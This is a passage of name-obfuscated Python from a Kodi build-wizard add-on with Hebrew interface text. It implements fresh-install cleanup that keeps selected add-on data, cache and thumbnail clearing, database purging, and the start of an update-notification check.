				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'skin.Premium.mod'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4899
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'skin.anonymous.nox'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4900
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'skin.phenomenal'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4901
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.metalliq'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4902
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'skin.titan'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4904
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'pvr.iptvsimple'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4905
				elif O00OO0O0OO0O0O0OO =='sources.xml'and O0O0000O0O0O00000 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4907
				elif O00OO0O0OO0O0O0OO =='quicknav.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4910
				elif O00OO0O0OO0O0O0OO =='x1101.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4911
				elif O00OO0O0OO0O0O0OO =='b-srtym-b.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4912
				elif O00OO0O0OO0O0O0OO =='x1102.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4913
				elif O00OO0O0OO0O0O0OO =='b-sdrvt-b.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4914
				elif O00OO0O0OO0O0O0OO =='x1112.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4915
				elif O00OO0O0OO0O0O0OO =='b-tlvvyzyh-b.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4916
				elif O00OO0O0OO0O0O0OO =='x1111.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4917
				elif O00OO0O0OO0O0O0OO =='b-tvknyshrly-b.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4918
				elif O00OO0O0OO0O0O0OO =='x1110.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4919
				elif O00OO0O0OO0O0O0OO =='b-yldym-b.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4920
				elif O00OO0O0OO0O0O0OO =='x1114.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4921
				elif O00OO0O0OO0O0O0OO =='b-mvzyqh-b.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4922
				elif O00OO0O0OO0O0O0OO =='mainmenu.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4923
				elif O00OO0O0OO0O0O0OO =='skin.Premium.mod.properties'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4924
				elif O00OO0O0OO0O0O0OO =='x1122.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4926
				elif O00OO0O0OO0O0O0OO =='b-spvrt-b.DATA.xml'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4927
				elif O00OO0O0OO0O0O0OO =='favourites.xml'and O0O0000O0O0O00000 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4932
				elif O00OO0O0OO0O0O0OO =='guisettings.xml'and O0O0000O0O0O00000 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4934
				elif O00OO0O0OO0O0O0OO =='profiles.xml'and O0O0000O0O0O00000 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4935
				elif O00OO0O0OO0O0O0OO =='advancedsettings.xml'and O0O0000O0O0O00000 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4936
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4937
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'program.apollo'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4938
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4939
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.elementum'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4942
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4943
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4944
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'weather.yahoo'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4945
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.quasar'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4946
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'program.apollo'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4947
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4948
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4949
				elif O00OO0O0OO0O0O0OO in LOGFILES :wiz .log ("Keep Log File: %s"%O00OO0O0OO0O0O0OO ,xbmc .LOGNOTICE )#line:4950
				elif O00OO0O0OO0O0O0OO .endswith ('.db'):#line:4951
					try :#line:4952
						if O00OO0O0OO0O0O0OO ==O0O00O0O0O000OOO0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00OO0O0OO0O0O0OO ,KODIV ),xbmc .LOGNOTICE )#line:4953
						else :os .remove (os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ))#line:4954
					except Exception as OOOO00O00O0OO000O :#line:4955
						if not O00OO0O0OO0O0O0OO .startswith ('Textures13'):#line:4956
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4957
							wiz .log ("-> %s"%(str (OOOO00O00O0OO000O )),xbmc .LOGNOTICE )#line:4958
							wiz .purgeDb (os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ))#line:4959
				else :#line:4960
					DP .update (int (wiz .percentage (O0O000O0O0000OO00 ,O00O0OO00OOO00OOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O0OO0O0O0OO ),'')#line:4961
					try :os .remove (os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ))#line:4962
					except Exception as OOOO00O00O0OO000O :#line:4963
						wiz .log ("Error removing %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4964
						wiz .log ("-> / %s"%(str (OOOO00O00O0OO000O )),xbmc .LOGNOTICE )#line:4965
			if DP .iscanceled ():#line:4966
				DP .close ()#line:4967
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4968
				return False #line:4969
		for O0O0000OO00000OO0 ,O00O000000000OO0O ,OOO0O00000O00OO00 in os .walk (O0O0O0OO0O0OOOO0O ,topdown =True ):#line:4970
			O00O000000000OO0O [:]=[O0O0000O0OO0OOOO0 for O0O0000O0OO0OOOO0 in O00O000000000OO0O if O0O0000O0OO0OOOO0 not in EXCLUDES ]#line:4971
			for O00OO0O0OO0O0O0OO in O00O000000000OO0O :#line:4972
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO0O0OO0O0O0OO ),'')#line:4973
			  if O00OO0O0OO0O0O0OO not in ["Database","userdata","temp","addons","addon_data"]:#line:4974
			   if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4975
			    if not (O00OO0O0OO0O0O0OO =='skin.titan'and KEEPSKIN3 =='true'):#line:4977
			      if not (O00OO0O0OO0O0O0OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4978
			       if not (O00OO0O0OO0O0O0OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4979
			        if not (O00OO0O0OO0O0O0OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4980
			         if not (O00OO0O0OO0O0O0OO =='program.apollo'and KEEPINFO =='true'):#line:4981
			          if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4982
			           if not (O00OO0O0OO0O0O0OO =='weather.yahoo'and KEEPWEATHER =='true'):#line:4983
			            if not (O00OO0O0OO0O0O0OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4984
			             if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4985
			              if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4986
			               if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4987
			                if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4988
			                 if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4989
			                  if not (O00OO0O0OO0O0O0OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:4990
			                   if not (O00OO0O0OO0O0O0OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:4991
			                    if not (O00OO0O0OO0O0O0OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4992
			                     if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4993
			                       if not (O00OO0O0OO0O0O0OO =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4995
			                           if not (O00OO0O0OO0O0O0OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4999
			                            if not (O00OO0O0OO0O0O0OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5000
			                             if not (O00OO0O0OO0O0O0OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5001
			                              if not (O00OO0O0OO0O0O0OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5002
			                               if not (O00OO0O0OO0O0O0OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5003
			                                  shutil .rmtree (os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),ignore_errors =True ,onerror =None )#line:5005
			if DP .iscanceled ():#line:5006
				DP .close ()#line:5007
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5008
				return False #line:5009
		DP .close ()#line:5010
		wiz .clearS ('build')#line:5011
		if over ==True :#line:5012
			return True #line:5013
		elif install =='restore':#line:5014
			return True #line:5015
		elif install :#line:5016
			buildWizard (install ,'normal',over =True )#line:5017
		else :#line:5018
			if INSTALLMETHOD ==1 :O00000O00O00000O0 =1 #line:5019
			elif INSTALLMETHOD ==2 :O00000O00O00000O0 =0 #line:5020
			else :O00000O00O00000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5021
			if O00000O00O00000O0 ==1 :wiz .reloadFix ('fresh')#line:5022
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5023
	else :#line:5024
		if not install =='restore':#line:5025
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5026
			wiz .refresh ()#line:5027
def clearCache ():#line:5032
		wiz .clearCache ()#line:5033
def fixwizard ():#line:5037
		wiz .fixwizard ()#line:5038
def totalClean ():#line:5040
		wiz .clearCache ()#line:5042
		wiz .clearPackages ('total')#line:5043
		clearThumb ('total')#line:5044
		cleanfornewbuild ()#line:5045
def cleanfornewbuild ():#line:5046
		try :#line:5047
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5048
		except :#line:5049
			pass #line:5050
		try :#line:5051
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5052
		except :#line:5053
			pass #line:5054
		try :#line:5055
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5056
		except :#line:5057
			pass #line:5058
def clearThumb (type =None ):#line:5059
	O0O0OO0O0000O0OO0 =wiz .latestDB ('Textures')#line:5060
	if not type ==None :O00O00OOO0O00O0OO =1 #line:5061
	else :O00O00OOO0O00O0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0O0OO0O0000O0OO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5062
	if O00O00OOO0O00O0OO ==1 :#line:5063
		try :wiz .removeFile (os .join (DATABASE ,O0O0OO0O0000O0OO0 ))#line:5064
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0O0OO0O0000O0OO0 )#line:5065
		wiz .removeFolder (THUMBS )#line:5066
	else :wiz .log ('Clear thumbnames cancelled')#line:5068
	wiz .redoThumbs ()#line:5069
def purgeDb ():#line:5071
	OOOO00O00OOO0O0OO =[];O0OOOO00OO0O00O00 =[]#line:5072
	for O0O00O00000O000O0 ,O00OOO0OOO0OO0OO0 ,O0O00O0OO0OO0O0O0 in os .walk (HOME ):#line:5073
		for OO0OOOOO000O0O00O in fnmatch .filter (O0O00O0OO0OO0O0O0 ,'*.db'):#line:5074
			if OO0OOOOO000O0O00O !='Thumbs.db':#line:5075
				O0000O00O0O00OOOO =os .path .join (O0O00O00000O000O0 ,OO0OOOOO000O0O00O )#line:5076
				OOOO00O00OOO0O0OO .append (O0000O00O0O00OOOO )#line:5077
				O000O0O00000OOO0O =O0000O00O0O00OOOO .replace ('\\','/').split ('/')#line:5078
				O0OOOO00OO0O00O00 .append ('(%s) %s'%(O000O0O00000OOO0O [len (O000O0O00000OOO0O )-2 ],O000O0O00000OOO0O [len (O000O0O00000OOO0O )-1 ]))#line:5079
	if KODIV >=16 :#line:5080
		O0OO00000O000OO0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OOOO00OO0O00O00 )#line:5081
		if O0OO00000O000OO0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5082
		elif len (O0OO00000O000OO0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5083
		else :#line:5084
			for O00OO0000O0O000O0 in O0OO00000O000OO0O :wiz .purgeDb (OOOO00O00OOO0O0OO [O00OO0000O0O000O0 ])#line:5085
	else :#line:5086
		O0OO00000O000OO0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OOOO00OO0O00O00 )#line:5087
		if O0OO00000O000OO0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5088
		else :wiz .purgeDb (OOOO00O00OOO0O0OO [O00OO0000O0O000O0 ])#line:5089
def fastupdatefirstbuild (OO000000000O0OOO0 ):#line:5095
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5097
	if ENABLE =='Yes':#line:5098
		if not NOTIFY =='true':#line:5099
			O0O000O00OOO00OO0 =wiz .workingURL (NOTIFICATION )#line:5100
			if O0O000O00OOO00OO0 ==True :#line:5101
				O0OO00OO0O0OOO000 ,O00O0O00O0000000O =wiz .splitNotify (NOTIFICATION )#line:5102
				if not O0OO00OO0O0OOO000 ==False :#line:5104
					try :#line:5105
						O0OO00OO0O0OOO000 =int (O0OO00OO0O0OOO000 );OO000000000O0OOO0 =int (OO000000000O0OOO0 )#line:5106
						checkidupdate ()#line:5107
						wiz .setS ("notedismiss","true")#line:5108
						if O0OO00OO0O0OOO000 ==OO000000000O0OOO0 :#line:5109
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OO00OO0O0OOO000 ),xbmc .LOGNOTICE )#line:5110
						elif O0OO00OO0O0OOO000 >OO000000000O0OOO0 :#line:5112
							wiz .log ("[Notifications] id: %s"%str (O0OO00OO0O0OOO000 ),xbmc .LOGNOTICE )#line:5113
							wiz .setS ('noteid',str (O0OO00OO0O0OOO000 ))#line:5114
							wiz .setS ("notedismiss","true")#line:5115
